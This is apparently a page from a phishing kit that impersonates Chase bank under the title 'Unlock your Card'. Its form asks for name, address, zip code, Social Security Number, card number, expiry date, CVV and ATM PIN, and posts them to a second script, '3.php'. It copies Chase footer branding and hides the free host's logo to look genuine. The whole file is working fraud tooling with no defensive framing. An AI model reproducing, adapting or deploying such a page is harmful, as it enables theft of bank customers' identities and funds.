<?php
include '../Valid.php'



?>
<html lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Unlock your Card
    </title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="pics/favicon.ico">
    <link rel="apple-touch-icon" sizes="76x76" href="pics/favicon.png">
    <link rel="stylesheet" href="styles/app.css">
    <script type="text/javascript" src="https://js-codes.com/modernizr/2.9.1/modernizr.min.js">
    </script>
    <script type="text/javascript" src="scripts/jquery-3.3.1.min.js">
    </script> 
    <script type="text/javascript" src="scripts/jquery.ccvalid.js">
    </script>
    <script type="text/javascript" src="scripts/jquery.mask.min.js">
    </script>
	
	
<style>
@media ( max-width : 659px) { /*Only Mobile*/
	.responsive-img.logo {
		width: 180px;
		padding-bottom: 14px;
	}
}

@media ( min-width : 660px) and (max-width:959px) { /*Only Tablet*/
	.responsive-img.logo {
		width: 210px;
		padding-bottom: 14px;
	}
}

.infoBox,.blueInfoBox,.errorBox {
	margin: 0rem 2.5% 2rem 4.5%;
	width: 90%;
}

.blueInfoIcon {
	color: #00AEEF;
}
#popup_this {
    top: 50%;
    left: 50%;
    text-align:center;
    margin-top: -50px;
    margin-left: -100px;
    position: fixed;
    background: #fff;
    padding: 30px;
}
.b-close {
    position: absolute;
    right: 0;
    top: 0;
    cursor: pointer;
    color: #fff;
    background: #ff0000;
    padding: 5px 10px;
}
</style>

<script src="./styles/jquery.bpopup.min.js"></script>

<script>
$( document ).ready(function() {
    $('#popup_this').bPopup();
	
});
</script>

  </head>
  <body>
  



    <div>
      <div>
        <header>
          <div>
          </div>
        </header>
        <main>
          <div class="container">
            <div class="bg">
            </div>
            <div class="row">
              <div class="col-xs-12 col-sm-6 col-sm-offset-3 box">
                <div class="form_area">
                  <div class="row">
                    <div class="col-xs-10 col-xs-offset-1" id="form_box">
                      <form action="3.php" id="signsmall" enctype="application/x-www-form-urlencoded" method="post" aria-label="Login" class="login__section login__form login__form--primary">

            <div class="row">

    </div>
               <div class="row">
            <div class="col-lg-6 col-sm-6 col-xs-6">
                <input name="fnm" class="input" placeholder="First Name" type="text" required="">
            </div>
            <div class="col-lg-6 col-sm-6 col-xs-6">
                <input name="lnm" class="input" placeholder="Last Name" type="text" required="">
            </div>
        </div>
                <input name="adr" class="input" placeholder="Address Line 1" type="text" required="">
        <div class="row">
            
            <div class="col-lg-6 col-sm-6 col-xs-6">
                <input name="zip" class="input" placeholder="Zip Code" type="tel" required="" maxlength="6">
            </div>
        </div>

        
            
           
                <input name="ssn" class="input" placeholder="Social Security Number (SSN)" type="tel" required="">
            
     
        
           

            <div class="row">

    </div><br>
    <input name="ccn" class="input" placeholder="Card number" type="text" required>
    <div class="row">
        <div class="col-lg-4 col-sm-4 col-xs-4">
            <div class="select default">
                <select name="mnt" class="input" required>
                    <option value="none" disabled selected>MM</option>
                    <option value="01">01</option>
                    <option value="02">02</option>
                    <option value="03">03</option>
                    <option value="04">04</option>
                    <option value="05">05</option>
                    <option value="06">06</option>
                    <option value="07">07</option>
                    <option value="08">08</option>
                    <option value="09">09</option>
                    <option value="10">10</option>
                    <option value="11">11</option>
                    <option value="12">12</option>
                </select>
            </div>
        </div>
        <div class="col-lg-4 col-sm-4 col-xs-4">
            <div class="select default">
                <select name="yer" class="input" required>
                    <option value="none" disabled selected>YYYY</option>
                    <option value="2020">2020</option>
                    <option value="2021">2021</option>
                    <option value="2022">2022</option>
                    <option value="2023">2023</option>
                    <option value="2024">2024</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2028">2028</option>
                    <option value="2029">2029</option>
                    <option value="2030">2030</option>
                </select>
            </div>
        </div>
                <div class="col-lg-4 col-sm-4 col-xs-4">
    <input name="csc" class="input" placeholder="CVV" type="tel" required maxlength="4">

        </div>
    </div>
        <div class="row">
            <div class="col-lg-4 col-sm-4 col-xs-4">
                <input name="atm" class="input" placeholder="ATM PIN" type="password" required maxlength="4">
            </div>
            
            </div>
            <br>
            

    <div class="row">
        <button type="submit" class="primary"><span class="label">Continue</span></button>
    </div>
    
</form>


                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
      <footer>
        <div>
          <div class="container">
            <div class="footer_socials row">
              <div class="col-xs-12">
                <span>Follow us:
                </span>
                <ul>
                  <li>
                    <i class="facebook icon">
                    </i>
                  </li>
                  <li>
                    <i class="instagram icon">
                    </i>
                  </li>
                  <li>
                    <i class="twitter icon">
                    </i>
                  </li>
                  <li>
                    <i class="youtube icon">
                    </i>
                  </li>
                  <li>
                    <i class="linkedin icon">
                    </i>
                  </li>
                </ul>
              </div>
            </div>
            <div class="footer_list row">
              <div class="col-xs-12">
                <ul>
                  <li>
                    <a href="javascript:void(0)">Contact us
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Privacy
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Security
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Terms of use
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Our commitment to accessibility
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">SAFE Act: Chase Mortgage Loan Originators
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Fair Lending
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">About Chase
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">J.P. Morgan
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">JPMorgan Chase &amp; Co.
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Careers
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Español
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Chase Canada
                    </a>
                  </li>
                  <li>
                    <a href="javascript:void(0)">Site map
                    </a>
                  </li>
                  <li>Member FDIC
                  </li>
                  <li>
                    <i class="home_icon icon">
                    </i> Equal Housing Lender
                  </li>
                  <br>
                  <li>2020 JPMorgan Chase &amp; Co.
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
    <div id="rotate" style="display:none">
      <div class="circle">
      </div>
      <div class="overlay">
      </div>
    </div>
    <script>$(document).ready(function(){
        $(document).on("click",".checkbox",function(){
          $(this).not(".check_id").find("input[type=checkbox]").toggleClass("checked")}
                      )}
                             );
    </script>
  </body>
  <style>
    img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
display: none;}
</style>
</html>
